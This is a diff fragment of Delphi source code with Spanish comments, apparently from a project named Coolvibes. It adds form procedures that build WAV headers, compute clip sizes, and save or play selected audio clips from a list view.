+  wFormato.WFormatTag := WAVE_FORMAT_PCM;
+  wFormato.NChannels:=nChannels; //1=mono 2= stereo
+  wFormato.wBitsPerSample:=wBitsPerSample; //8,16
+  wFormato.NSamplesPerSec:=NSamplesPerSec;//HZ
+  wFormato.NBlockAlign:=(wFormato.nChannels * wFormato.wBitsPerSample) div 8;
+  wFormato.NAvgBytesPerSec:=wFormato.NSamplesPerSec*wFormato.NBlockAlign;
+  wFormato.cbSize:= 0;
+
+  WaveBuffLen := length(b);
+  RiffSize :=  20 + SizeOf(wFormato) + WaveBuffLen;
+  Fmt_Size := SizeOf(wFormato);
+  with ms do
+  begin
+    //escribimos la cabecera del archivo .wav
+    Write(RiffStr[1], Length(RiffStr));
+    Write(RiffSize, SizeOf(integer));
+    Write(WaveStr[1], Length(WaveStr));
+    Write(Fmt_Str[1], Length(Fmt_Str));
+    Write(Fmt_Size, SizeOf(integer));
+    Write(wFormato, SizeOf(TWaveFormatEx));
+    Write(DataStr[1], Length(DataStr));
+    
+    Write(WaveBuffLen, sizeof(integer));
+
+    //Esribimos la onda
+    Write(b[1], length(b));
+  end;
+
+end;
+
+procedure TFormControl.SpinEditAudioChange(Sender: TObject);
+var
+  size, i: integer;
+begin
+  for i := 0 to ListViewAudioFormato.items.count-1 do
+    if ListViewAudioFormato.items[i].checked then
+      ListViewAudioFormato.items[i].selected := true;
+      
+  if ListviewAudioFormato.selected <> nil then
+  begin
+
+    Size := strtoint(copy(listviewAudioFormato.selected.caption , 1, pos(' ',listviewAudioFormato.selected.caption)-1));
+
+    if listviewAudioFormato.selected.subitems[1] = '16' then
+      Size := Size * 2;
+
+    if listviewAudioFormato.selected.subitems[0] = 'Stereo' then
+    begin
+      Size := Size * 2;
+    end;
+
+      Size := Size * strtointdef(SpinEditAudio.text,1);
+    LabelLengthAudio.caption := _('Tamaño')+': '+ inttostr(size div 1024)+ ' KB';
+  end;
+end;
+
+procedure TFormControl.Eliminar2Click(Sender: TObject);
+var
+  tmpitem : Tlistitem;
+begin
+     mslistviewitem := ListViewAudio.Selected;
+
+      while Assigned(mslistviewitem) do
+      begin
+        Freemem(mslistviewitem.data);
+        tmpitem := mslistviewitem;
+        mslistviewitem := ListViewAudio.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+        tmpitem.delete;
+      end;
+end;
+
+procedure TFormControl.Guardar1Click(Sender: TObject);
+var
+  MS: TMemoryStream;
+  Buffer : string;
+  Total : string;
+  Tempstr1, tempstr2, tempstr3, tmpstr: string;
+  Ruta : string;
+begin
+  DlgGuardar.Title      := _('Guardar Audio ::Coolvibes::');
+  DlgGuardar.InitialDir := GetCurrentDir();
+  DlgGuardar.Filter     := _('Audio')+' .wav|*.wav';
+  DlgGuardar.DefaultExt := 'wav';
+  if DlgGuardar.Execute then
+  begin
+      mslistviewitem := ListViewAudio.Selected;
+      while Assigned(mslistviewitem) do
+      begin
+        setlength(Buffer, strtoint(mslistviewitem.subitems.strings[4]));
+        movememory(pointer(Buffer), mslistviewitem.data, strtoint(mslistviewitem.subitems.strings[4]));
+
+
+        //Agregamos solamente la onda, ignorando los headers
+        Total := Total + copy(buffer,1+length(buffer)-strtoint(mslistviewitem.subitems[0]),strtoint(mslistviewitem.subitems[0]));
+
+        TmpStr := mslistviewitem.subitems[3];
+        TempStr1 := Copy(TmpStr, 1, pos('-', TmpStr) - 1);     //HZ
+        Delete(TmpStr, 1, pos('-', TmpStr));
+        TempStr2 := Copy(TmpStr, 1, pos('-', TmpStr) - 1);     //Canal
+        Delete(TmpStr, 1, pos('-', TmpStr));
+        TempStr3 := TmpStr;                                    //Bits
+
+        mslistviewitem := ListViewAudio.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+      end;
+       //Si el grupo de sonidos que queremos guardar son de distinta frecuencia
+      try
+        MS := TMemoryStream.create;
+        InitWavFile(MS, strtoint(TempStr2), strtoint(TempStr1), strtoint(TempStr3), total);
+        Ms.savetofile(DlgGuardar.FileName);
+      finally
+        ms.free;
+      end;
+      StatusBar.panels[1].text := _('Audio guardado con éxito:')+' '+ DlgGuardar.FileName;
+    end;
+end;
+
+procedure TFormControl.Reproducir1Click(Sender: TObject);
+var
+  MS: TMemoryStream;
+  Buffer : string;
+  Total : string;
+  Tempstr1, tempstr2, tempstr3, tmpstr: string;
+  Ruta : string;
+begin
+      mslistviewitem := ListViewAudio.Selected;
+      while Assigned(mslistviewitem) do
+      begin
+        setlength(Buffer, strtoint(mslistviewitem.subitems.strings[4]));
+        movememory(pointer(Buffer), mslistviewitem.data, strtoint(mslistviewitem.subitems.strings[4]));
+
+
+        //Agregamos solamente la onda, ignorando los headers
+        Total := Total + copy(buffer,1+length(buffer)-strtoint(mslistviewitem.subitems[0]),strtoint(mslistviewitem.subitems[0]));
+
+        TmpStr := mslistviewitem.subitems[3];
+        TempStr1 := Copy(TmpStr, 1, pos('-', TmpStr) - 1);     //HZ
+        Delete(TmpStr, 1, pos('-', TmpStr));
+        TempStr2 := Copy(TmpStr, 1, pos('-', TmpStr) - 1);     //Canal
+        Delete(TmpStr, 1, pos('-', TmpStr));
+        TempStr3 := TmpStr;                                    //Bits
+
+        mslistviewitem := ListViewAudio.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+      end;
+       //Si el grupo de sonidos que queremos guardar son de distinta frecuencia
+
+        MS := TMemoryStream.create;
+        InitWavFile(MS, strtoint(TempStr2), strtoint(TempStr1), strtoint(TempStr3), total);
+        sndPlaySound(Ms.memory, SND_MEMORY or SND_ASYNC);
+end;
+
+procedure TFormControl.ListViewAudioFormatoClick(Sender: TObject);
+begin
+  SpinEditAudioChange(nil);
 end;
 
 end.//Fin del proyecto
